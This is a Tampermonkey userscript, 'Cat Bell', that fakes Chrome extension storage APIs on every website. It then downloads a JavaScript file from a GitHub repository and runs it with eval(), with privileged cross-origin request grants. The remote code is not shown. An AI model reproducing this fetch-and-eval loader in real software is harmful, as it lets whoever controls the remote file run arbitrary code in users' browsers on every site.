// ==UserScript==
// @name         Cat Bell - Tampermonkey Loader
// @namespace    http://tampermonkey.net/
// @version      1.7
// @description  @catdzs1tg
// @author       catdzs1vn
// @match        http://*/*
// @match        https://*/*
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_deleteValue
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// ==/UserScript==

(function() {
    'use strict';

    if (typeof window.chrome === 'undefined') window.chrome = {};
    if (!window.chrome.storage) {
        window.chrome.storage = {
            local: {
                get: function(keys, callback) {
                    let result = {};
                    if (typeof keys === 'string') {
                        result[keys] = GM_getValue(keys);
                    } else if (Array.isArray(keys)) {
                        keys.forEach(key => { result[key] = GM_getValue(key); });
                    } else if (typeof keys === 'object') {
                        for (let key in keys) {
                            let val = GM_getValue(key);
                            result[key] = val !== undefined ? val : keys[key];
                        }
                    }
                    if (typeof callback === 'function') callback(result);
                },
                set: function(items, callback) {
                    for (let key in items) { GM_setValue(key, items[key]); }
                    if (typeof callback === 'function') callback();
                },
                remove: function(keys, callback) {
                    if (typeof keys === 'string') { GM_deleteValue(keys); }
                    else if (Array.isArray(keys)) { keys.forEach(key => GM_deleteValue(key)); }
                    if (typeof callback === 'function') callback();
                }
            }
        };
    }

    if (!window.chrome.runtime) {
        window.chrome.runtime = {
            onMessage: { addListener: function() {} }
        };
    }

    GM_xmlhttpRequest({
        method: "GET",
        url: "https://raw.githubusercontent.com/Asustv123/Auto-uptolink1/main/content.js",
        onload: function(response) {
            if (response.status === 200) {
                eval(response.responseText);
            }
        }
    });
})();
